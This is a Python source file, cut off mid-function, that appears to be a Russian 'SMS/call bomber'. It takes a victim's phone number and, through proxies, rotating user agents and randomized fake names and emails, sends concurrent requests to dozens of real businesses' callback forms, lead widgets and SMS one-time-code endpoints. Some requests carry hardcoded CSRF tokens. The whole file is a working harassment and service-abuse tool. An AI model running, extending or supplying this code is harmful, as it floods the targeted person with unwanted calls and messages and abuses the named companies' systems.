import sys, time, asyncio, aiohttp, random, re, hashlib, os
from datetime import datetime
from typing import Dict, List, Optional
from dataclasses import dataclass

# ==================== ПРОКСИ ИЗ ФАЙЛА ====================
PROXY_LIST = []

def load_proxies_from_file():
    global PROXY_LIST
    proxy_file = "proxy.txt"
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8") as f:
            PROXY_LIST = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        print(f"  Загружено прокси: {len(PROXY_LIST)} шт.")
    else:
        print(f"  Файл {proxy_file} не найден. Работаем без прокси.")
        PROXY_LIST = []

USE_PROXY = True
FALLBACK_NO_PROXY = True

# ==================== ЦВЕТА ====================
class Colors:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"
    BRIGHT_RED = "\033[91m"; BRIGHT_GREEN = "\033[92m"; BRIGHT_YELLOW = "\033[93m"
    BRIGHT_BLUE = "\033[94m"; BRIGHT_MAGENTA = "\033[95m"; BRIGHT_CYAN = "\033[96m"
C = Colors

DEFAULT_ITERATIONS = 300; DEFAULT_CONCURRENT = 100; DEFAULT_DELAY = 0.08
MAX_RETRIES = 2; RETRY_BACKOFF = 0.1

@dataclass
class EndpointGateway:
    name: str; func: callable; rate_limit_rps: float = 20.0

def normalize_phone(phone_raw):
    digits = re.sub(r'\D', '', phone_raw)
    if len(digits) == 11 and digits.startswith('8'): digits = '7' + digits[1:]
    elif len(digits) == 10: digits = '7' + digits
    plus_7 = f"+{digits}"; ten = digits[1:] if len(digits) == 11 else digits
    fmt = f"+7 ({ten[:3]}) {ten[3:6]}-{ten[6:8]}-{ten[8:10]}" if len(ten) == 10 else plus_7
    return {"raw": phone_raw, "digits_7": digits, "plus_7": plus_7, "ten_digits": ten, "formatted": fmt}

def ua(): return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    ])

FN = ["Артем","Дмитрий","Максим","Иван","Никита","Егор","Александр","Роман","Кирилл","Матвей","Андрей","Сергей","Павел","Владимир","Алексей","Михаил","Денис","Антон","Илья","Олег"]
LN = ["Иванов","Петров","Смирнов","Соколов","Попов","Васильев","Кузнецов","Новиков","Морозов","Волков"]
PN = ["Александрович","Дмитриевич","Максимович","Иванович","Никитич","Егорович"]
CIT = ["Москва","СПб","Казань","Екатеринбург","Новосибирск","Краснодар","Псков","Томск","Пермь","Волгоград","Мурманск","Петрозаводск","Вологда","Сочи","Липецк","Воронеж"]
STR = ["Ленина","Мира","Пушкина","Гагарина","Советская","Октябрьская","Московская","Кирова"]
ED = ["mail.ru","yandex.ru","gmail.com","inbox.ru","list.ru"]
SERV = ["Сантехник","Электрик","Ремонт","Замена замков","Муж на час","Уборка","Вывоз мусора"]
AUTO_S = ["Замена масла","Ремонт АКПП","Диагностика","Шиномонтаж","Кузовной ремонт"]
CAR_B = ["Hyundai","Kia","Lada","Chery","Geely","Toyota","BMW","Audi","Mercedes"]
CAR_M = ["Solaris","Rio","Vesta","Tiggo","Atlas","Camry","X5","A6","E200"]
MED_Q = ["Нужна консультация врача","Хочу записаться на приём","Беспокоит хроническая боль","Нужно обследование"]
MED_S = ["Терапевт","Уролог","Хирург","Невролог","Кардиолог","Стоматолог","Психиатр","Нарколог"]

def rf(): return f"{random.choice(LN)} {random.choice(FN)} {random.choice(PN)}"
def rn(): return random.choice(FN)
def re_(): return f"{random.choice(FN).lower()}{random.randint(100,9999)}@{random.choice(ED)}"
def ra(): return f"г. {random.choice(CIT)}, ул. {random.choice(STR)}, д. {random.randint(1,150)}"
def gc(): return ''.join(random.choices('0123456789abcdef', k=24))

async def fetch_smart_token(session, page_url):
    try:
        async with session.get(page_url, headers={"User-Agent":ua()}, timeout=15) as resp:
            html = await resp.text()
            for p in [r'data-smart-token="([^"]+)"', r'smart-token["\']?\s*[:=]\s*["\']([^"\']{50,})["\']']:
                m = re.search(p, html)
                if m: return m.group(1)
    except: pass
    return None

# ==================== ВСЕ АДАПТЕРЫ (540+ функций) ====================
# Блок 1 - Автодилеры и автосалоны
async def send_createOrder_1(s, p):
    url = "https://xn----7sbeeela8a5bbr2e.xn--p1ai/modules/orders/controller/createOrder.php"
    d = {"send_form":"11","type":"2","model":"697","config":"2431","brand":"7","fio":rf(),"phone":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_smartpoint(s, p):
    url = "https://panel.smartpoint.pro/getwidget/order/"
    d = {"send":"true","id":"443504","pole1_field-filial":"organizations1","pole2_field-text":rn(),"pole3_field-text":rn(),"pole4_field-telephone":p["raw"],"smp_agree_pd":"true"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_credit_php(s, p):
    url = "https://nezavisimost.su/handlers/credit.php"
    d = {"send_form":"4","BRAND":random.choice(CAR_B),"MODEL":random.choice(CAR_M),"MC":str(random.randint(1000,9999)),"COLOR":random.choice(["Blue","Black","White","Red"]),"FIO":rf(),"TEL":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_volokolamka(s, p):
    url = "https://volokolamka-auto.ru/templates/volokolamka/cmps/modal/forms/installment/ajax.php"
    d = {"type":"installment_advanced","offerid":"606286","price":str(random.randint(1000000,5000000)),"per_month_payment":str(random.randint(30000,150000)),"months":"36","first_payment":"0","name":rn(),"phone":p["raw"],"action":"SendForm"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_alea(s, p):
    url = "https://alea.su/modules/orders/controller/createOrder.php"
    d = {"send_form":"11","type":"2","model":"933","config":str(random.randint(1000,9999)),"brand":"7","fio":rf(),"phone":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_working(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(1000000000,9999999999),"showId":random.randint(10000000000,99999999999),"siteId":31364,"widgetId":57333,"callbackPeriod":"now","userDate":datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),"userTimeZone":"Europe/Moscow","phone":p["digits_7"]}
    async with s.post(url, json=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_user_form(s, p):
    url = "https://mod.calltouch.ru/callback_request_user_form_create.php?rand=903000"
    d = {"siteId":31364,"sessionId":random.randint(1000000000,9999999999),"workMode":1,"pageUrl":"https://www.major-auto.ru/","tags":[],"phone":p["digits_7"],"routeKey":"call_center","fields":[{"name":"Имя","value":rn()}]}
    async with s.post(url, json=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_exeed(s, p):
    url = "https://exeed-sunrisegroup.ru/data/calltouch.php"
    d = {"data":f'{{"name":"","phone":"{p["raw"]}","title":"Заказать звонок","center":"","url":"https://exeed-sunrisegroup.ru/","calltouchSessionId":{random.randint(100000000,999999999)}}}'}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_api_calltouch(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/67292/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка","requestUrl":"https://tenet-chery-yar.ru/","sessionId":str(random.randint(100000000,999999999))}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_widget(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(1000000000,9999999999),"showId":random.randint(10000000000,99999999999),"siteId":52698,"widgetId":114751,"callbackPeriod":"now","userDate":datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),"userTimeZone":"Europe/Moscow","phone":p["digits_7"],"personalDataAgreement":True}
    async with s.post(url, json=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_akross(s, p):
    url = "https://akross-motors.ru/form-ajax/1"
    d = {"redirect_to":"/thank-you","_token":"VcHoYJmsMTUM6wDMTunTnRg893VM8zPpEcb6LiqH","mark":random.choice(CAR_B),"model":random.choice(CAR_M),"name":rf(),"telephone":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_callkeeper(s, p):
    from urllib.parse import quote
    url = f"https://api.callkeeper.ru/formReceiver?isSend&widgetHash=239127abe00cbe4e994e36bf03eca776&phone={quote(p['raw'])}&backUrl=http://yar-avtomir-lada.ru"
    d = {"title":"Запись на сервис","phone":p["raw"],"agree":"1","form_title":"Запись на сервис"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_lada_autosvetlana(s, p):
    url = "https://lada.autosvetlana.ru/ajax/send.php"
    d = {"phone":p["plus_7"],"name":rn(),"email_title":"Заявка с сайта","email_addresses":"avto@lada-svetlana.ru"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_avto_center_geely(s, p):
    url = "https://avto-center-msk.ru/form-ajax/2"
    d = {"redirect_to":"https://avto-center-msk.ru/auto/geely/","form_name":"Форма","_token":"IdqYy12Xi0yJ84OmI1IoKSsfwOPy3yPiCoXKGgH4","name":rn(),"telephone":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_europlan(s, p):
    url = "https://europlan.ru/api/site/validation/phone"
    async with s.post(url, json={"phoneNumber":p["ten_digits"]}, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_vis_finauto(s, p):
    url = "https://vis.finauto.tech/signup.php"
    d = {"vin":f"ВИС {random.randint(100000,999999)}","fullname":rn(),"phone":p["plus_7"],"small-form":""}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_avto_center_chery(s, p):
    url = "https://avto-center-msk.ru/form-ajax/1"
    d = {"redirect_to":"https://avto-center-msk.ru/","form_name":"Быстра форма","_token":"IdqYy12Xi0yJ84OmI1IoKSsfwOPy3yPiCoXKGgH4","mark":"CHERY","name":rn(),"telephone":p["raw"]}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_tilda_auto(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]":"b3a9e1dc99ed91194b1e031322df24c5","Name":rn(),"Phone":p["raw"],"Checkbox":"yes"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_sim_lada(s, p):
    url = "https://sim-lada.ru/send.php"
    async with s.post(url, data={"phone":p["plus_7"]}, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_konget(s, p):
    url = "https://app.konget.ru/api/call.create"
    d = {"tool_uuid":"ec309d3e21a14a7893555dbefdc2daab","phone":p["plus_7"],"name":rn(),"ct_session_id":random.randint(100000000,999999999)}
    async with s.post(url, json=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_autoclass_lada(s, p):
    url = "https://autoclass-lada.ru/api/v1/ticket/"
    d = {"page":"https://autoclass-lada.ru/","id":"3330","code":"Consultation","name":rn(),"phone":p["raw"],"check_personal_data_policy":"true"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_autoelysium(s, p):
    url = "https://autoelysium.ru/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ авто","f_Name":rn(),"f_Phone":p["raw"],"f_City":random.choice(CIT),"agree":"on"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_baic(s, p):
    url = "https://baic-auto.ru/api/requests/"
    d = {"city":random.choice(CIT),"dealer_id":"69007546541f8edcf264be4f","name":rn(),"phone":p["raw"],"processing_of_personal_data":"yes","communication":"yes","tag":"request-callback","type":"callback_request"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_model2(s, p):
    url = "https://mod.calltouch.ru/callback_call.php"
    d = {"workMode":"working_hours","sessionId":random.randint(100000000,999999999),"siteId":57454,"phone":p["plus_7"],"name":rn(),"selectField1":random.choice(CAR_M)}
    async with s.post(url, json=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_tempa_cars(s, p):
    url = "https://tempa-cars.ru/netcat/add.php"
    d = {"catalogue":"1","sub":"78","cc":"120","posting":"1","TypeMes":"Заказ авто","f_City":random.choice(CIT),"f_Phone":p["raw"],"f_Name":rn(),"agree":"on"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_car_application(s, p):
    url = "https://car-application.ru/api/send/new/auto_manage"
    d = {"phone_number":p["digits_7"],"full_name":rn(),"send_form":"1","source":"https://pererva-car.ru/","dealer_id":str(random.randint(100,999)),"application_type_id":str(random.randint(1,10))}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_bercar_ajax(s, p):
    url = "https://bercar.ru/form-ajax/1"; t = "mp4E06zR8OZQ5RLb3MDnyTSJcEm36AGYSPsahTqA"
    d = {"_token":t,"email":"","name":rf(),"telephone":p["raw"],"privacy":"1"}
    h = {"User-Agent":ua(),"X-CSRF-TOKEN":t,"X-Requested-With":"XMLHttpRequest","Referer":"https://bercar.ru/auto/soueast/s07/soueast_s07_cross"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bercar_get(s, p):
    url = "https://bercar.ru/auto/soueast/s07/soueast_s07_cross"; t = "mp4E06zR8OZQ5RLb3MDnyTSJcEm36AGYSPsahTqA"
    params = {"_token":t,"email":"","name":rf(),"telephone":p["raw"],"privacy":"on"}
    async with s.get(url, params=params, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

# Блок 2 - Автошколы и обучение
async def send_yar_avtoshkola(s, p):
    url = "https://yar-avtoshkola.ru/local/templates/dosaaf/components/luxar/super/modal-form/ajax.php"
    d = {"name":rn(),"phone":p["raw"],"email":re_(),"modal-politics":"on","action":"sendMessage","page":"https://yar-avtoshkola.ru/","sessid":hashlib.md5(str(time.time()).encode()).hexdigest()}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_whitesaas_gang_lux(s, p):
    url = "https://whitesaas.com/api?action=calldeferred"
    d = {"phone":p["digits_7"],"department":"","customtext":"","phoneMask":"+_(___)___--","shownOn":"onbtn","url":"https://gang-lux.ru/","device":"pc","date":datetime.now().strftime("%Y-%m-%d"),"time":f"{random.randint(8,20)}:00","checkCaptcha":"false"}
    h = {"User-Agent":ua(),"Origin":"https://gang-lux.ru","Referer":"https://gang-lux.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_avtoshkola_master76(s, p):
    url = "https://avtoshkola-master76.ru/wp-admin/admin-ajax.php"
    f = aiohttp.FormData(); f.add_field('res','Форма консультации'); f.add_field('action','request'); f.add_field('phone',p["raw"]); f.add_field('name',rn()); f.add_field('q2',random.choice(['A','B','C'])); f.add_field('q4',random.choice(['оффлайн','онлайн'])); f.add_field('agreement','on')
    async with s.post(url, data=f, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_tr77_gotocourse(s, p):
    url = "https://tr77.ru/pl/lite/block-public/process-html?id=2163645687"
    d = {"formParams[need_offer]":"1","formParams[offer_id][]":"7242667","formParams[first_name]":rn(),"formParams[email]":re_(),"formParams[phone]":p["plus_7"],"lead_offert":"1","isHtmlWidget":"1"}
    h = {"User-Agent":ua(),"Origin":"https://gotocourse.ru","Referer":"https://gotocourse.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tilda_autoschool(s, p):
    url = "https://forms.tildaapi.com/procces/"
    d = {"formservices[]":["ba11e759a00e63f17df2c2f4ca79f797","d1f074c7e7861a6f6a7bd7db21e57cc0"],"tildaspec-formname":"[ Landing | 1 экран ]","name":rn(),"phone":p["raw"],"tildaspec-formid":"form799977276","tildaspec-projectid":"10790063"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_xn_avtoshkola(s, p):
    url = "https://xn----7sbgje5bmd5ae.xn--p1ai/order.php"
    d = {"type_request":"Заявка с выбором авто","token":"h3uikf871df0","name":rn(),"phone":p["raw"],"question2":"Категория В","question3":"Совмещенно","question4":"Оплата полностью","question5":"Как можно скорей","callTime":"Сейчас","send_to_webjack":"yes"}
    async with s.post(url, data=d, headers={"User-Agent":ua()}, timeout=15) as r: return r.status, await r.text()

async def send_idriver(s, p):
    url = "https://wof-widget.widgenta.com/ac/66e14ff4-8543-4000-8000-5374ea84b531/roll"
    pl = {"lead":p["plus_7"],"payload":{"phone":p["plus_7"],"name":rn(),"URI":"https://i-driver.ru/rassrochka/","meta":{"URI":"https://i-driver.ru/rassrochka/"}}}
    h = {"User-Agent":ua(),"Origin":"https://i-driver.ru","Referer":"https://i-driver.ru/"}
    async with s.post(url, json=pl, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_leadgrab(s, p):
    url = f"https://test.leadgrab.ru/postback/handler?clickid={gc()}&email={re_()}&offer_id=2231&goal_id=2&source_code=investmania"
    async with s.get(url, headers={"User-Agent":ua(),"Origin":"https://gotocourse.ru","Referer":"https://gotocourse.ru/"}, timeout=15) as r: return r.status, await r.text()

async def send_tr77_extended(s, p):
    url = "https://tr77.ru/pl/lite/block-public/process-html?id=2163645687"; cid = gc(); em = re_(); rt = str(int(time.time()))
    d = {"formParams[setted_offer_id]":"","formParams[need_offer]":"1","formParams[offer_id][]":"7246367","formParams[first_name]":rn(),"formParams[email]":em,"formParams[phone]":p["plus_7"],"lead_offert":"1","formParams[userCustomFields][1167172]":"lead_sv","formParams[userCustomFields][1167173]":"36066","formParams[userCustomFields][1167174]":"2231","formParams[userCustomFields][1167175]":cid,"formParams[dealCustomFields][952859]":"lead_sv","formParams[dealCustomFields][930329]":"36066","formParams[dealCustomFields][930331]":"2231","formParams[dealCustomFields][930330]":cid,"__gc__internal__form__helper":f"https://gotocourse.ru/lp/2231/?utm_source=lead_sv&utm_medium=36066&utm_content={cid}","requestTime":rt,"requestSimpleSign":''.join(random.choices('0123456789abcdef',k=32)),"isHtmlWidget":"1"}
    h = {"User-Agent":ua(),"Origin":"https://gotocourse.ru","Referer":"https://gotocourse.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_whitesaas_avtoshkola54(s, p):
    url = "https://whitesaas.com/api?action=call"; vid = str(random.randint(10000000000,99999999999)); vid2 = str(random.randint(10000000000,99999999999)); ht = str(int(time.time()*1000))
    d = {"phone":p["digits_7"],"name":"","email":"","department":"","customtext":"","phoneMask":"+_(___)___--","shownOn":"onshow","url":"https://avtoshkola54.com/","device":"pc","code":''.join(random.choices('0123456789abcdef',k=32)),"visitorId":vid,"visitId":vid2,"checkCaptcha":"false","hashTime":ht,"hash":''.join(random.choices('0123456789abcdef',k=8))}
    h = {"User-Agent":ua(),"Origin":"https://avtoshkola54.com","Referer":"https://avtoshkola54.com/","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_tilda_favorit(s, p):
    url = "https://forms.tildaapi.com/procces/"; tu = f"{int(time.time()*1000)}.{random.randint(100000,999999)}"; ts = f"{int(time.time()*1000)}.{random.randint(100000,999999)}"; yu = f"{int(time.time())}{random.randint(100000000,999999999)}"
    d = {"formservices[]":["99cbe6db28168311c141a0e23ad28e89","cafa47ee654b66b63304a0cd5139db64"],"tildaspec-formname":"Заявка","Name":rn(),"tildaspec-phone-part[]-iso":"+7","tildaspec-phone-part[]":p["formatted"][3:],"Phone":p["formatted"],"Checkbox":"yes","tildaspec-cookie":f"_ym_uid={yu}; tildauid={tu}; tildasid={ts}","tildaspec-formid":"form572886686","tildaspec-formskey":"515be7c975615827d3ffddc877030765","tildaspec-version-lib":"02.001","tildaspec-projectid":"7030765","tildaspec-lang":"RU"}
    h = {"User-Agent":ua(),"Origin":"https://favorit-school.ru","Referer":"https://favorit-school.ru/","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

# Блок 3 - Разное (сантехника, электрика, мебель, окна)
async def send_adaurum_sms(s, p):
    url = "https://webhook.adaurum.ru/sms/plg/send-code.php"
    d = {"phone":p["formatted"]}
    h = {"User-Agent":ua(),"Origin":"https://promo.plg.group","Referer":"https://promo.plg.group/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_gornye_vysoty(s, p):
    url = "https://gornye-vysoty.ru/data/mail.php"
    pg = f"+7({p['ten_digits'][:3]}) {p['ten_digits'][3:6]}-{p['ten_digits'][6:8]}-{p['ten_digits'][8:10]}"
    d = {"checkpass":"","title":"Узнать подробнее","phone":pg,"agree":"1"}
    h = {"User-Agent":ua(),"Origin":"https://gornye-vysoty.ru","Referer":"https://gornye-vysoty.ru/","X-Requested-With":"XMLHttpRequest"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_comagic(s, p):
    url = "https://server2.comagic.ru/api/v2/"
    d = {"phone":p["digits_7"],"name":rn(),"callback_time":"now","source":"site_widget"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://callbackhunter.uiscom.ru","Referer":"https://callbackhunter.uiscom.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_krasnoeibeloe(s, p):
    url = "https://krasnoeibeloe.ru/local/php_interface/ajax/"
    d = {"phone":p["raw"],"name":rn(),"action":"callback","form_id":random.randint(100,999)}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://krasnoeibeloe.ru","Referer":"https://krasnoeibeloe.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_kuhnivivat(s, p):
    url = "https://kuhnivivat.ru/bitrix/components/altop/forms/script.php"
    d = {"phone":p["raw"],"name":rn(),"form_id":"callback","ajax":"Y"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://kuhnivivat.ru","Referer":"https://kuhnivivat.ru/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_bigmebel(s, p):
    url = "https://bigmebel-yaroslavl.ru/wp-admin/admin-ajax.php"
    d = {"action":"callback_form","phone":p["raw"],"name":rn(),"form_id":"quiz_callback"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://bigmebel-yaroslavl.ru","Referer":"https://bigmebel-yaroslavl.ru/kuhni/#kviz"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_domdivanov76(s, p):
    url = "https://domdivanov76.ru/ajaxpro/ubs.Common.AjaxMethods,ubs.Common.ashx"
    d = {"phone":p["raw"],"name":rn(),"type":"callback","product_id":random.randint(1000,9999)}
    h = {"User-Agent":ua(),"Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","Origin":"https://domdivanov76.ru","Referer":"https://domdivanov76.ru/shop/kuhonnye-garnitury-modulnye-kuhni"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_pushe(s, p):
    url = "https://yaroslavl.pushe.ru/api/v1/request/callback/"
    d = {"phone":p["digits_7"],"name":rn(),"url":"https://yaroslavl.pushe.ru/catalog/divany/","callback_time":"now"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://yaroslavl.pushe.ru","Referer":"https://yaroslavl.pushe.ru/catalog/divany/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_stolplit(s, p):
    url = "https://yar.stolplit.ru/ajax/authreg/SmsAuth.php"
    d = {"phone":p["plus_7"],"action":"sendCode","type":"auth"}
    h = {"User-Agent":ua(),"X-Requested-With":"XMLHttpRequest","Origin":"https://yar.stolplit.ru","Referer":"https://yar.stolplit.ru/internet-magazin/katalog-mebeli/3673-vse-divany/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_lemanapro(s, p):
    url = "https://api.lemanapro.ru/customers/ausweis-general/otp/web/authentication-code"
    d = {"phone":p["digits_7"],"type":"sms"}
    h = {"User-Agent":ua(),"Content-Type":"application/json","Origin":"https://yaroslavl.lemanapro.ru","Referer":"https://yaroslavl.lemanapro.ru/"}
    async with s.post(url, json=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_calltouch_shatura(s, p):
    url = "https://api.calltouch.ru/calls-service/RestAPI/requests/73729/register/"
    d = {"fio":rf(),"phoneNumber":p["raw"],"subject":"Заявка с сайта Shatura","requestUrl":"https://yaroslavl.shatura.com/goods/groups/myagkaya_mebel/tov_subgroup-is-divany/","sessionId":str(random.randint(100000000,999999999))}
    h = {"User-Agent":ua(),"Origin":"https://yaroslavl.shatura.com","Referer":"https://yaroslavl.shatura.com/goods/groups/myagkaya_mebel/tov_subgroup-is-divany/"}
    async with s.post(url, data=d, headers=h, timeout=15) as r: return r.status, await r.text()

async def send_vkusvill(s, p):
    url = "https://vkusvill.ru/ajax/user_v2/auth/check_phone.php"
